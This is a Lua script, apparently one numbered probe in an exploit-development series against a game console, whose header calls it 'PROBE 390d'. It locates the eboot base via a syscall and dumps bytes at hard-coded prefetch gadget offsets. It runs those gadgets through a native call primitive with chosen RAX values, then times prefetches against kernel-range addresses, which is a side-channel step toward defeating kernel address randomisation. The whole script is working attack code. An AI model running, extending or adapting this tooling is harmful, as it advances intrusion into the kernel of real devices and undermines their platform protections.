-- CRASH_CLASS: MODERATE
-- PROBE 390d: Test which prefetch instructions survive fcall_with_rax
--
-- Context: 390c found zero clean gadgets but 17 prefetch + 24 prefetchw hits.
-- native.fcall_with_rax(addr, rax_val) jumps to addr with RAX=rax_val.
-- If addr = prefetchnta [rax], then prefetch executes on rax_val as addr.
-- The question is: do the instructions AFTER the prefetch crash or return?
-- We test each hit with a safe heap address first.

print("=== PROBE 390d: prefetch survival test ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function zero_buf(addr, len)
    for i = 0, len - 4, 4 do wd(N(addr) + i, 0) end
end

-- Get eboot base
local info = memory.alloc(0x200)
zero_buf(info, 0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eboot = rd(N(info) + 0x108) or 0
print(string.format("eboot: 0x%X", eboot))

-- Safe test address (heap page we can read)
local safe_page = memory.alloc(0x4000)
zero_buf(safe_page, 0x4000)
local safe_addr = N(safe_page)

-- Prefetch offsets from 390b (prefetchnta/t0/t1/t2 [rax] variants)
-- modrm=00 → prefetchnta [rax], modrm=10 → prefetcht1 [rax]
local prefetch_rax = {
    {0x18BC84, "prefetchnta [rax]"},
    {0x21BB6A, "prefetchnta [rax]"},
    {0x3EDD44, "prefetchnta [rax]"},
    {0x20B39D, "prefetcht1 [rax]"},
    {0x336645, "prefetcht1 [rax]"},
    {0x33CF7D, "prefetcht1 [rax]"},
    {0x33DD99, "prefetcht1 [rax]"},
    {0x33E205, "prefetcht1 [rax]"},
}

-- Prefetchw [rax] hits
local prefetchw_rax = {
    {0x1E53C4, "prefetchw [rax]"},
    {0x20BE3D, "prefetchw [rax]"},
    {0x28B421, "prefetchw [rax]"},
    {0x2DB493, "prefetchw [rax]"},
    {0x305C4A, "prefetchw [rax]"},
}

-- Prefetch [rdi] hit (rdi is first arg in SysV ABI, not controllable via fcall_with_rax)
-- But: native.fcall_with_rax MIGHT pass rax as first visible register...
-- Let's also note: +0x9A2CD prefetcht2 [rdi]

-- ===================================================================
-- [A] Read 32 bytes context at each hit
-- ===================================================================
print("[A] context dump")

local all_hits = {}
for _, h in ipairs(prefetch_rax) do
    all_hits[#all_hits + 1] = {off = h[1], name = h[2]}
end
for _, h in ipairs(prefetchw_rax) do
    all_hits[#all_hits + 1] = {off = h[1], name = h[2]}
end

for _, h in ipairs(all_hits) do
    local addr = eboot + h.off
    local ok, chunk = pcall(function() return memory.read_buffer(addr, 32) end)
    if ok and type(chunk) == "string" then
        local hex = {}
        for i = 1, math.min(#chunk, 20) do
            hex[#hex + 1] = string.format("%02X", string.byte(chunk, i))
        end
        -- Check if there's a C3 (ret) within first 20 bytes
        local ret_pos = nil
        for i = 4, math.min(#chunk, 20) do  -- skip first 3 bytes (the prefetch itself)
            if string.byte(chunk, i) == 0xC3 then
                ret_pos = i - 1  -- offset from start
                break
            end
        end
        local tag = ret_pos and string.format(" (C3@+%d)", ret_pos) or " (no C3 in 20B)"
        print(string.format("  +0x%X %s: %s%s", h.off, h.name, table.concat(hex, " "), tag))
    end
end

if not alive() then print("DEAD after [A]"); return end
print("")

-- ===================================================================
-- [B] Survival test — call each with safe heap address in RAX
-- ===================================================================
print("[B] survival test (safe heap addr in rax)")

local survivors = {}

for _, h in ipairs(all_hits) do
    if not alive() then
        print("  DEAD before testing +0x" .. string.format("%X", h.off))
        break
    end

    local addr = eboot + h.off
    local ok, rv = pcall(function()
        return native.fcall_with_rax(uint64(addr), safe_addr)
    end)

    if ok then
        survivors[#survivors + 1] = h
        print(string.format("  +0x%X %s: SURVIVED ret=%s", h.off, h.name, tostring(N(rv))))
    else
        print(string.format("  +0x%X %s: CRASHED", h.off, h.name))
    end

    if not alive() then
        print("  process DEAD after this call")
        break
    end
end

if not alive() then print("DEAD after [B]"); return end
print(string.format("  survivors: %d / %d", #survivors, #all_hits))
print("")

-- ===================================================================
-- [C] If any survived, test with kernel addresses
-- ===================================================================
if #survivors > 0 then
    print("[C] kernel address test")

    local best = survivors[1]
    local gadget = eboot + best.off
    print(string.format("  using +0x%X %s", best.off, best.name))

    -- Test with various kernel-range addresses
    local test_addrs = {
        {0xFFFF800000000000, "kernel base low"},
        {0xFFFF800040000000, "kernel +1GB"},
        {0xFFFF800080000000, "kernel +2GB"},
        {0xFFFF8000C0000000, "kernel +3GB"},
        {0xFFFF800100000000, "kernel +4GB"},
        {0xFFFF800200000000, "kernel +8GB"},
    }

    for _, t in ipairs(test_addrs) do
        if not alive() then print("  DEAD"); break end

        local kaddr = uint64(string.format("0x%X", t[1]))
        local ok, rv = pcall(function()
            return native.fcall_with_rax(uint64(gadget), kaddr)
        end)

        if ok then
            print(string.format("  %s (0x%X): SURVIVED ret=%s", t[2], t[1], tostring(N(rv))))
        else
            print(string.format("  %s (0x%X): CRASHED", t[2], t[1]))
            if not alive() then print("  process DEAD"); break end
        end
    end

    if not alive() then print("DEAD after [C]"); return end
    print("")

    -- ===================================================================
    -- [D] Timing measurement if kernel addrs survived
    -- ===================================================================
    print("[D] timing test")

    local sc_gtod = mk(116)
    local tv = memory.alloc(16)

    local function get_usec()
        zero_buf(tv, 16)
        pcall(function() sc_gtod(tv, uint64(0)) end)
        local sec = rd(N(tv)) or 0
        local usec = rd(N(tv) + 8) or 0
        return sec * 1000000 + usec
    end

    local ITERS = 5000

    -- Baseline: safe heap address
    local t1 = get_usec()
    for i = 1, ITERS do
        native.fcall_with_rax(uint64(gadget), safe_addr)
    end
    local t2 = get_usec()
    local heap_time = t2 - t1
    print(string.format("  heap addr (%d iters): %d usec", ITERS, heap_time))

    -- Test unmapped userland address
    local t1 = get_usec()
    for i = 1, ITERS do
        native.fcall_with_rax(uint64(gadget), uint64(0x7FFF00000000))
    end
    local t2 = get_usec()
    local unmapped_time = t2 - t1
    print(string.format("  unmapped user (%d iters): %d usec", ITERS, unmapped_time))

    -- Test kernel addresses
    for _, t in ipairs(test_addrs) do
        if not alive() then break end
        local kaddr = uint64(string.format("0x%X", t[1]))
        local t1 = get_usec()
        for i = 1, ITERS do
            pcall(function() native.fcall_with_rax(uint64(gadget), kaddr) end)
        end
        local t2 = get_usec()
        print(string.format("  %s (%d iters): %d usec", t[2], ITERS, t2 - t1))
    end
end

if not alive() then print("DEAD after timing"); return end
print("")

print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 390d COMPLETE ===")
